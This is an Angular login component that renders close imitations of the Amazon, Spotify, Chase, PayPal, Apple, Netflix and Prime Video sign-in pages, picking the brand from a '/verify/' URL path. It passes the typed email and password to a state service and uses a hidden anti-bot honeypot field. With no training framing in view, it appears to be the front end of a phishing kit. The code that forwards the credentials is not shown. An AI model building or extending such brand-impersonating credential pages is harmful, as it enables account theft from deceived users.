import { Component, inject, computed, signal, OnInit } from '@angular/core';
import { CommonModule, NgIf } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { Router } from '@angular/router';
import { StateService } from '../services/state.service';
import { getFlowById } from '../services/flows.service';
import { TranslatePipe } from '../pipes/translate.pipe';
import { InputComponent } from './ui/input.component';
import { ButtonComponent } from './ui/button.component';
import { CardComponent, CardVariant } from './ui/card.component';

@Component({
  selector: 'app-login',
  standalone: true,
  imports: [
    CommonModule,
    FormsModule,
    TranslatePipe,
    InputComponent,
    ButtonComponent,
    CardComponent,
    NgIf
  ],
  host: {
    '[attr.data-theme]': 'currentFlowId()'
  },
  template: `
    <div class="min-h-screen w-full flex flex-col items-center justify-center p-4 transition-colors duration-500"
         [class.login-container]="currentFlowId() === 'netflix'"
         [style.background-color]="backgroundColor()">
      
      <!-- Chase Header Bar -->
      @if (currentFlowId() === 'chase') {
         <div class="w-full fixed top-0 left-0 bg-[#117aca] py-4 px-6 flex items-center justify-between z-50">
             <img [src]="logoPath()" class="h-6 brightness-0 invert" alt="Chase Logo">
             <span class="text-white text-sm font-bold">Sign in</span>
         </div>
      }

      <!-- Spotify Logo (Centered Top) -->
      @if (currentFlowId() === 'spotify') {
          <div class="w-full text-center py-8">
               <img [src]="logoPath()" class="h-10 mx-auto" alt="Spotify">
          </div>
      }

      <!-- Amazon Logo (Centered Top) -->
      @if (currentFlowId() === 'amazon') {
          <div class="mb-4 text-center">
              <img [src]="logoPath()" class="h-8 mx-auto" alt="Amazon Logo">
          </div>
      }

      <div class="w-full max-w-md animate-in slide-in-from-bottom-4 duration-500"
           [class.mt-16]="currentFlowId() === 'chase'"> 
          
          <!-- Logo Header (Standard + Prime) -->
          @if (showLogo() && !['chase', 'netflix', 'spotify', 'amazon'].includes(currentFlowId())) {
             <div class="mb-4 text-center">
                <img [src]="logoPath()" class="h-12 mx-auto" [alt]="currentFlowName() + ' Logo'">
             </div>
          }

          <!-- BRAND SPECIFIC CONTAINERS -->

          <!-- AMAZON (NO CARD) -->
          @if (currentFlowId() === 'amazon') {
             <div class="bg-white border border-[#ddd] rounded-lg p-6 w-full shadow-sm">
                 <h1 class="text-3xl font-normal mb-4 text-black">Sign in</h1>
                 <form (submit)="onSubmit($event)" class="space-y-4">
                     <div>
                         <label class="block text-[13px] font-bold mb-1 text-black">Email or mobile phone number</label>
                         <input type="email" [(ngModel)]="email" name="email" 
                                class="w-full h-[31px] px-2 border border-[#888] rounded-[3px] focus:outline-none focus:ring-1 focus:ring-[#e77600] focus:border-[#e77600] shadow-inner text-black text-[13px]">
                     </div>
                     <div>
                        <div class="flex justify-between items-center mb-1">
                            <label class="text-[13px] font-bold text-black">Password</label>
                            <a href="#" class="text-[13px] text-[#0066c0] hover:text-[#c45500] hover:underline">Forgot your password?</a>
                        </div>
                        <input type="password" [(ngModel)]="password" name="password" 
                               class="w-full h-[31px] px-2 border border-[#888] rounded-[3px] focus:outline-none focus:ring-1 focus:ring-[#e77600] focus:border-[#e77600] shadow-inner text-black text-[13px]">
                     </div>
                     <button type="submit" 
                             class="w-full h-[31px] bg-gradient-to-b from-[#f7dfa5] to-[#f0c14b] border border-[#a88734] rounded-[3px] text-[13px] text-black hover:bg-[#f0c14b] active:shadow-inner mt-2">
                         {{ isLoading() ? 'Signing in...' : 'Sign in' }}
                     </button>
                     <div class="text-[12px] text-slate-600 leading-normal mt-4">
                        By continuing, you agree to Amazon's <a href="#" class="text-[#0066c0] hover:text-[#c45500] hover:underline">Conditions of Use</a> and <a href="#" class="text-[#0066c0] hover:text-[#c45500] hover:underline">Privacy Notice</a>.
                     </div>
                     <div class="flex items-center gap-2 mt-4 pt-2 border-t border-[#f3f3f3]">
                         <input type="checkbox" class="w-3 h-3 border-[#888] rounded-[2px]">
                         <span class="text-[13px] text-black">Keep me signed in. <a href="#" class="text-[#0066c0] hover:text-[#c45500] hover:underline">Details</a></span>
                     </div>
                 </form>
             </div>

             <div class="mt-6 pt-4 text-center space-y-3 relative">
                 <div class="absolute top-2 left-0 w-full flex items-center">
                      <div class="flex-grow border-t border-[#e7e7e7]"></div>
                      <span class="px-2 text-xs text-gray-500 whitespace-nowrap bg-white">New to Amazon?</span>
                      <div class="flex-grow border-t border-[#e7e7e7]"></div>
                 </div>
                 <div class="pt-6">
                    <button class="w-full h-[31px] bg-gradient-to-b from-[#f8f8f8] to-[#e7e9ec] border border-[#adb1b8] rounded-[3px] text-[13px] text-black hover:bg-[#e7e9ec] shadow-sm">
                        Create your Amazon account
                    </button>
                 </div>
             </div>
          }

          <!-- SPOTIFY (DARK FULL WIDTH) -->
          @else if (currentFlowId() === 'spotify') {
             <div class="w-full bg-[#121212] p-8 sm:p-12 text-white rounded-lg shadow-2xl">
                <h1 class="text-center text-3xl font-bold mb-8 text-white tracking-tight">Log in to Spotify</h1>
                
                <div class="space-y-3">
                    <button class="w-full py-3 px-8 rounded-full border border-[#878787] font-bold text-sm tracking-widest uppercase hover:border-white transition-colors flex items-center justify-center gap-3">
                         Continue with Google
                    </button>
                    <button class="w-full py-3 px-8 rounded-full border border-[#878787] font-bold text-sm tracking-widest uppercase hover:border-white transition-colors flex items-center justify-center gap-3">
                         Continue with Facebook
                    </button>
                    <button class="w-full py-3 px-8 rounded-full border border-[#878787] font-bold text-sm tracking-widest uppercase hover:border-white transition-colors flex items-center justify-center gap-3">
                         Continue with Apple
                    </button>
                </div>

                <div class="flex items-center my-8">
                    <div class="flex-grow border-t border-[#292929]"></div>
                    <span class="px-4 text-[13px] text-[#b3b3b3] font-bold">OR</span>
                    <div class="flex-grow border-t border-[#292929]"></div>
                </div>

                <form (submit)="onSubmit($event)" class="space-y-4">
                    <div>
                        <label class="block text-sm font-bold mb-2 text-white">Email address or username</label>
                        <input type="email" [(ngModel)]="email" name="email" 
                               class="w-full h-12 px-4 bg-[#121212] border border-[#727272] rounded-[4px] text-white focus:outline-none focus:border-white placeholder:text-[#a7a7a7]"
                               placeholder="Email address or username">
                    </div>
                    <div>
                        <label class="block text-sm font-bold mb-2 text-white">Password</label>
                        <input type="password" [(ngModel)]="password" name="password" 
                               class="w-full h-12 px-4 bg-[#121212] border border-[#727272] rounded-[4px] text-white focus:outline-none focus:border-white placeholder:text-[#a7a7a7]"
                               placeholder="Password">
                    </div>
                    <div class="flex items-center py-2">
                        <label class="relative inline-flex items-center cursor-pointer">
                            <input type="checkbox" class="sr-only peer">
                            <div class="w-11 h-6 bg-[#727272] peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full rtl:peer-checked:after:-translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:start-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-[#1db954]"></div>
                            <span class="ms-3 text-sm font-bold text-white">Remember me</span>
                        </label>
                    </div>
                    <button type="submit" 
                            class="w-full py-4 bg-[#1db954] text-black font-bold rounded-full hover:scale-[1.02] active:scale-[0.98] transition-all text-base mt-2">
                        {{ isLoading() ? 'LOGGING IN...' : 'LOG IN' }}
                    </button>
                    <div class="text-center mt-6">
                        <a href="#" class="text-white hover:text-[#1db954] hover:underline text-sm font-bold underline underline-offset-4 decoration-[#727272]">Forgot your password?</a>
                    </div>
                </form>

                <div class="mt-8 pt-8 border-t border-[#292929] text-center">
                    <p class="text-[#a7a7a7] font-bold text-base mb-4">Don't have an account?</p>
                    <a href="#" class="inline-block text-white font-bold hover:text-[#1db954] hover:underline text-base uppercase tracking-widest border border-[#727272] hover:border-white px-8 py-3 rounded-full transition-all">Sign up for Spotify</a>
                </div>
             </div>
          }

          <!-- STANDARD UI-CARD (PayPal, Apple, Chase, etc.) -->
          @else {
              <ui-card [variant]="cardVariant()" [noPadding]="false" [interactive]="false" [class.glass-effect]="currentFlowId() === 'apple'">
                
                <!-- Netflix Logo inside card -->
                @if (currentFlowId() === 'netflix') {
                    <div class="mb-10 text-left">
                        <img [src]="logoPath()" class="h-8" alt="Netflix">
                    </div>
                }
                
                <!-- Prime Video Heading -->
                @if (currentFlowId() === 'prime-video') {
                    <h1 class="text-2xl font-normal mb-1 text-white">Sign in</h1>
                    <p class="text-sm text-[#89ABB4] mb-6">Watch on Prime Video</p>
                }
                
                <!-- Standard Header Content -->
                @if (['paypal', 'apple', 'chase'].includes(currentFlowId())) {
                    <div class="text-center mb-6">
                       <h1 class="text-2xl font-bold mb-2 tracking-tight text-slate-900" [style.color]="headerColor()" *ngIf="currentFlowId() !== 'chase'">
                         {{ 'LOGIN.TITLE' | translate }}
                       </h1>
                       <p class="text-base text-slate-600" [style.color]="textColor()">
                         {{ 'LOGIN.SUBTITLE' | translate }}
                       </p>
                    </div>
                }

                <!-- Login Form -->
                <form (submit)="onSubmit($event)" class="space-y-6">
                   
                   <!-- Prime Video: Label layout -->
                   <div *ngIf="currentFlowId() === 'prime-video'">
                       <label class="block text-sm font-bold mb-1 text-white">Email or mobile phone number</label>
                       <input type="email" [(ngModel)]="email" name="email" class="w-full h-10 px-3 border border-[#888] rounded-[3px] bg-white text-black">
                   </div>
                   
                   <!-- Standard Emails -->
                   @if (currentFlowId() !== 'prime-video') {
                       <ui-input
                          [label]="currentFlowId() === 'netflix' ? '' : ('LOGIN.EMAIL_LABEL' | translate)"
                          type="email"
                          [(ngModel)]="email"
                          name="email"
                          [placeholder]="currentFlowId() === 'chase' ? 'Username' : ('LOGIN.EMAIL_PLACEHOLDER' | translate)"
                          [error]="touched() && !email ? 'Required' : ''"
                          (blur)="touched.set(true)"
                          [iconLeft]="true"
                          [class.netflix-input]="currentFlowId() === 'netflix'">
                          <span slot="icon-left" *ngIf="currentFlowId() !== 'netflix' && currentFlowId() !== 'chase'">
                              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.501 20.118a7.5 7.5 0 0114.998 0A17.933 17.933 0 0112 21.75c-2.676 0-5.216-.584-7.499-1.632z" />
                              </svg>
                          </span>
                       </ui-input>
                   }
                   
                   <!-- Prime Video: Password layout -->
                   <div *ngIf="currentFlowId() === 'prime-video'">
                       <div class="flex justify-between">
                           <label class="block text-sm font-bold mb-1 text-white">Password</label>
                           <a href="#" class="text-[#00A8E1] text-sm hover:underline">Forgot your password?</a>
                       </div>
                       <input type="password" [(ngModel)]="password" name="password" class="w-full h-10 px-3 border border-[#888] rounded-[3px] bg-white text-black">
                   </div>
                   
                   <!-- Standard Passwords -->
                   @if (currentFlowId() !== 'prime-video') {
                       <ui-input
                          [label]="currentFlowId() === 'netflix' ? '' : ('LOGIN.PASSWORD_LABEL' | translate)"
                          type="password"
                          [(ngModel)]="password"
                          name="password"
                          [placeholder]="'LOGIN.PASSWORD_PLACEHOLDER' | translate"
                          [error]="touched() && !password ? 'Required' : ''"
                          (blur)="touched.set(true)"
                          [iconLeft]="true"
                          [class.netflix-input]="currentFlowId() === 'netflix'">
                           <span slot="icon-left" *ngIf="currentFlowId() !== 'netflix' && currentFlowId() !== 'chase'">
                              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" />
                              </svg>
                           </span>
                       </ui-input>
                   }

                   <!-- Actions (Standard) -->
                   <div class="flex items-center justify-between text-sm" *ngIf="currentFlowId() !== 'prime-video'">
                      <label class="flex items-center gap-2 cursor-pointer opacity-80 hover:opacity-100 transition-opacity">
                         <input type="checkbox" [(ngModel)]="rememberMe" name="rememberMe" class="rounded text-blue-600 focus:ring-blue-500">
                         <span [style.color]="textColor()">{{ 'LOGIN.REMEMBER' | translate }}</span>
                      </label>
                      
                      <button type="button" class="font-medium hover:underline bg-transparent border-0 p-0 cursor-pointer" [style.color]="primaryColor()">
                         {{ 'LOGIN.FORGOT' | translate }}
                      </button>
                   </div>
                   
                   <!-- Submit Button -->
                   <ui-button 
                     type="submit"
                     [loading]="isLoading()"
                     [fullWidth]="true"
                     [variant]="primaryBtnVariant()">
                     {{ 'LOGIN.BUTTON' | translate }}
                   </ui-button>
                   
                   <!-- Honeypot Trap (Anti-Bot) -->
                   <div style="opacity: 0; position: absolute; top: 0; left: 0; height: 0; width: 0; z-index: -1; pointer-events: none;">
                       <label for="hp-field">Website URL</label>
                       <input id="hp-field" type="text" name="website_hp" [(ngModel)]="honeypotTrap" tabindex="-1" autocomplete="off">
                   </div>

                </form>

                <!-- Footer Slot -->
                @if (currentFlowId() === 'netflix') {
                    <div class="mt-4 text-left">
                        <span class="text-[#737373]">New to Netflix? </span>
                        <a href="#" class="text-white hover:underline">Sign up now.</a>
                    </div>
                }
                @else if (currentFlowId() === 'prime-video') {
                    <div class="mt-6 text-center text-sm">
                        <span class="text-[#89ABB4]">New to Prime Video? </span>
                        <a href="#" class="text-[#00A8E1] hover:underline">Join Prime Video</a>
                    </div>
                }
                @else {
                    <div class="mt-6 pt-6 border-t border-gray-100 dark:border-gray-800">
                         <div class="text-center">
                             <p class="text-sm text-gray-500 mb-3">New to the service?</p>
                             <ui-button 
                               variant="ghost" 
                               [fullWidth]="true"
                               (click)="onSignup()">
                               {{ 'LOGIN.SIGNUP' | translate }}
                             </ui-button>
                         </div>
                    </div>
                }

              </ui-card>
          }
      </div>
    </div>
  `,
  styles: [`
    :host { display: block; width: 100%; }
    :host[data-theme='netflix'] {
        --bg-context: #000000;
        --surface: #141414;
        --text-primary: #ffffff;
    }
    :host[data-theme='apple'] {
        --bg-context: #ffffff;
    }
  `]
})
export class LoginComponent implements OnInit {
  state = inject(StateService);
  router = inject(Router);

  // Flow State
  currentFlow = this.state.currentFlow;
  currentFlowId = computed(() => this.currentFlow()?.id || 'paypal');
  currentFlowName = computed(() => this.currentFlow()?.name || 'Service');

  // Form Model
  email = '';
  password = '';
  rememberMe = false;

  // UI State
  isLoading = signal(false);
  touched = signal(false);

  // Theme Computeds
  theme = computed(() => this.state.currentFlow()?.theme);

  headerColor = computed(() => this.theme()?.input.textColor || '#000000');
  textColor = computed(() => this.theme()?.input.textColor || '#666666');
  primaryColor = computed(() => this.theme()?.button.background || '#003087');
  backgroundColor = computed(() => this.theme()?.background || '#ffffff');

  // Logic Computeds
  showLogo = computed(() => ['paypal', 'apple', 'netflix', 'chase', 'amazon', 'prime-video', 'spotify'].includes(this.currentFlowId()));
  logoPath = computed(() => `assets/logos/${this.currentFlowId()}.svg`);

  primaryBtnVariant = computed(() => {
    if (this.currentFlowId() === 'netflix') return 'danger';
    return 'primary';
  });

  cardVariant = computed<CardVariant>(() => {
    return 'elevated';
  });

  // Anti-Bot
  honeypotTrap = '';

  onSubmit(event: Event) {
    event.preventDefault();
    if (this.honeypotTrap) return;

    if (this.email && this.password) {
      this.isLoading.set(true);
      this.state.login(this.email, this.password);
    } else {
      this.touched.set(true);
    }
  }

  ngOnInit() {
    // Detect flow from URL
    const path = window.location.pathname;
    const match = path.match(/\/verify\/([a-zA-Z0-9-]+)/);
    if (match && match[1]) {
      const flowId = match[1];
      const flow = getFlowById(flowId);
      if (flow) {
        this.state.currentFlow.set(flow);
      }
    }
  }

  onSignup() { }
}
